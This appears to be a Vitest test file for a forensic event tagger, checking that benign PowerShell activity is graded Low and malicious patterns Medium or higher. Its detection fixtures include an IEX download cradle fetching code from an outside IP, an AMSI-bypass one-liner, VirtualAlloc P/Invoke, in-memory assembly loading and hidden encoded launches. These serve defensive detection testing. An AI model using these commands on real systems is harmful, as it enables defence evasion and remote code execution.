import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { compileText } from "../../src/analysis/taggerStore.js";
import { runTagger, applyToForensicEvent } from "../../src/analysis/tagger.js";
import { parseSiemExport } from "../../src/analysis/siemImport.js";
import type { ForensicEvent } from "../../src/analysis/stateTypes.js";

// #2025: benign PowerShell housekeeping reached the forensic timeline at Medium.
//  - `__PSScriptPolicyTest_*.ps1` is written to %TEMP% by PowerShell on every start (AppLocker/WDAC
//    probe) and matched `staging_temp_executable`.
//  - Every 4103 record repeats the session's launch command in its ContextInfo `Host Application`
//    line, so ONE encoded launch made every cmdlet of that session (Write-Output, Join-Path, …)
//    match `win_powershell_encoded`.
// These run the REAL importer and the SHIPPED ruleset, the path an import takes.
const RULES = compileText(
  readFileSync(fileURLToPath(new URL("../../data/tags.yaml", import.meta.url)), "utf8"),
);
const RANK: Record<string, number> = { Info: 0, Low: 1, Medium: 2, High: 3, Critical: 4 };
const HOST = "WS01.lab.local";
const ENC_LAUNCH =
  "PowerShell.exe -exec bypass -Noninteractive -windowstyle hidden -e " +
  "WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdAA==";

type Graded = { severity: string; mitre: string[]; ruleIds: string[] };

function gradeRecord(rec: Record<string, unknown>): Graded {
  const r = parseSiemExport(JSON.stringify(rec));
  expect(r.events).toHaveLength(1);
  const event = { ...r.events[0], id: "e1", relatedFindingIds: [], sourceScreenshots: [] } as ForensicEvent;
  const proposal = runTagger([event], RULES).perEvent[0];
  const after = proposal ? applyToForensicEvent(event, proposal) : event;
  return { severity: after.severity, mitre: after.mitreTechniques ?? [], ruleIds: proposal?.ruleIds ?? [] };
}

function sysmonFile(eid: number, image: string, target: string): Record<string, unknown> {
  const label = eid === 11 ? "File created" : "File Delete archived";
  return {
    Message: `${label}:\r\nRuleName: -\r\nImage: ${image}\r\nTargetFilename: ${target}`,
    Channel: "Microsoft-Windows-Sysmon/Operational",
    SourceName: "Microsoft-Windows-Sysmon",
    EventID: eid,
    EventTime: "2026-05-02 03:58:07",
    Hostname: HOST,
    Image: image,
    TargetFilename: target,
    ProcessId: "4242",
    UtcTime: "2026-05-02 07:58:07.123",
  };
}

function ps4103(payload: string): Record<string, unknown> {
  return {
    Message:
      `${payload}\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = ConsoleHost\r\n` +
      `        Host Application = ${ENC_LAUNCH}\r\n        Engine Version = 5.1.18362.628\r\n` +
      `        User = LAB\\analyst1\r\n\r\nUser Data:\r\n\r\n`,
    Channel: "Microsoft-Windows-PowerShell/Operational",
    SourceName: "Microsoft-Windows-PowerShell",
    EventID: 4103,
    EventTime: "2026-05-02 03:58:07",
    Hostname: HOST,
    Payload: payload,
    ContextInfo: `        Host Application = ${ENC_LAUNCH}\r\n`,
  };
}

function invocation(cmdlet: string, bindings: Array<[string, string]>): string {
  return [
    `CommandInvocation(${cmdlet}): "${cmdlet}"`,
    ...bindings.map(([n, v]) => `ParameterBinding(${cmdlet}): name="${n}"; value="${v}"`),
  ].join("\r\n");
}

const PS_EXE = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
const TEMP = "C:\\Users\\analyst1\\AppData\\Local\\Temp";

describe("PSScriptPolicyTest files (#2025)", () => {
  it.each([
    [11, `${TEMP}\\__PSScriptPolicyTest_0gslifez.da2.ps1`],
    [11, `${TEMP}\\__PSScriptPolicyTest_uwalamv2.sts.psm1`],
    [11, "C:\\Windows\\Temp\\__PSScriptPolicyTest_a1b2c3d4.e5f.ps1"],
    [23, `${TEMP}\\__PSScriptPolicyTest_0gslifez.da2.ps1`],
  ])("EID %i of %s by PowerShell is at most Low with no MITRE tag", (eid, target) => {
    const g = gradeRecord(sysmonFile(eid, PS_EXE, target));
    expect(RANK[g.severity]).toBeLessThanOrEqual(RANK.Low);
    expect(g.mitre).toEqual([]);
  });

  it("the PowerShell remoting host's probe is at most Low with no MITRE tag", () => {
    const g = gradeRecord(
      sysmonFile(
        23,
        "C:\\Windows\\System32\\wsmprovhost.exe",
        `${TEMP}\\__PSScriptPolicyTest_k21q0u14.bgl.ps1`,
      ),
    );
    expect(RANK[g.severity]).toBeLessThanOrEqual(RANK.Low);
    expect(g.mitre).toEqual([]);
  });

  it.each(["C:\\Users\\analyst1\\Downloads\\dropper.exe", "C:\\Windows\\System32\\rundll32.exe"])(
    "the same name written by %s is still graded as staging",
    (image) => {
      const g = gradeRecord(sysmonFile(11, image, `${TEMP}\\__PSScriptPolicyTest_0gslifez.da2.ps1`));
      expect(g.severity).toBe("Medium");
      expect(g.ruleIds).toContain("staging_temp_executable");
    },
  );

  it("a different .ps1 PowerShell writes to Temp is still graded as staging", () => {
    const g = gradeRecord(sysmonFile(11, PS_EXE, `${TEMP}\\stage2.ps1`));
    expect(g.severity).toBe("Medium");
  });
});

describe("PowerShell 4103 in an encoded-launch session (#2025)", () => {
  it.each([
    ["Write-Output", [["InputObject", "done"]]],
    ["Write-Verbose", [["Message", "Created 'C:\\Users\\analyst1\\notes.txt'."]]],
    [
      "Join-Path",
      [
        ["Path", "C:\\Users\\analyst1\\"],
        ["ChildPath", "notes.txt"],
      ],
    ],
    [
      "Get-Random",
      [
        ["Minimum", "1"],
        ["Maximum", "10"],
      ],
    ],
    [
      "New-Object",
      [
        ["TypeName", "System.IO.FileInfo"],
        ["ArgumentList", "C:\\Users\\analyst1\\notes.txt"],
      ],
    ],
  ] as Array<[string, Array<[string, string]>]>)("a benign %s is at most Low", (cmdlet, bindings) => {
    const g = gradeRecord(ps4103(invocation(cmdlet, bindings)));
    expect(RANK[g.severity]).toBeLessThanOrEqual(RANK.Low);
    expect(g.ruleIds).not.toContain("win_powershell_encoded");
  });

  it.each([
    ["New-Object Net.WebClient", invocation("New-Object", [["TypeName", "system.net.webclient"]])],
    [
      "Invoke-Expression",
      invocation("Invoke-Expression", [
        ["Command", "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')"],
      ]),
    ],
    [
      "Set-Alias to an attack tool",
      invocation("Set-Alias", [
        ["Name", "invoke-smblogin"],
        ["Value", "invoke-smbexec"],
      ]),
    ],
    [
      "New-Alias SetBeacon",
      invocation("New-Alias", [
        ["Name", "SetBeacon"],
        ["Value", "Beacon"],
      ]),
    ],
    [
      "Add-Type",
      invocation("Add-Type", [
        [
          "TypeDefinition",
          '[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);',
        ],
      ]),
    ],
    [
      "an AMSI bypass",
      invocation("Invoke-Expression", [
        [
          "Command",
          "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        ],
      ]),
    ],
    [
      "an in-memory assembly load",
      invocation("Invoke-Command", [["ScriptBlock", "[System.Reflection.Assembly]::Load($bytes)"]]),
    ],
    [
      "a P/Invoke recon helper",
      invocation("Add-Type", [
        [
          "MemberDefinition",
          '[DllImport("netapi32.dll", SetLastError=true)] public static extern int NetWkstaGetInfo(string s, int l, out IntPtr b);',
        ],
      ]),
    ],
    [
      "a dynamic-assembly AssemblyName",
      invocation("New-Object", [
        ["TypeName", "System.Reflection.AssemblyName"],
        ["ArgumentList", "ReflectedDelegate"],
      ]),
    ],
    [
      "an implant naming its AMSI unhook",
      invocation("Write-Output", [["InputObject", "Run Unhook-AMSI first"]]),
    ],
    [
      "an encoded command in the payload itself",
      invocation("Start-Process", [
        ["FilePath", "powershell.exe"],
        ["ArgumentList", "-nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="],
      ]),
    ],
  ])("%s stays Medium or higher", (_name, payload) => {
    const g = gradeRecord(ps4103(payload));
    expect(RANK[g.severity]).toBeGreaterThanOrEqual(RANK.Medium);
  });
});

describe("script payload rules stay narrow (#2025)", () => {
  it.each([
    [
      "Add-Type of a plain C# helper",
      invocation("Add-Type", [
        ["TypeDefinition", 'public class Greeter { public static string Hi() { return "hi"; } }'],
      ]),
    ],
    [
      "Add-Type of a framework assembly",
      invocation("Add-Type", [["AssemblyName", "System.IO.Compression.FileSystem"]]),
    ],
    [
      "reading a DLL version",
      invocation("Invoke-Command", [
        ["ScriptBlock", "[System.Reflection.AssemblyName]::GetAssemblyName($dll).Version"],
      ]),
    ],
    [
      "an ordinary alias",
      invocation("Set-Alias", [
        ["Name", "ll"],
        ["Value", "Get-ChildItem"],
      ]),
    ],
  ])("%s is at most Low", (_name, payload) => {
    const g = gradeRecord(ps4103(payload));
    expect(RANK[g.severity]).toBeLessThanOrEqual(RANK.Low);
  });
});
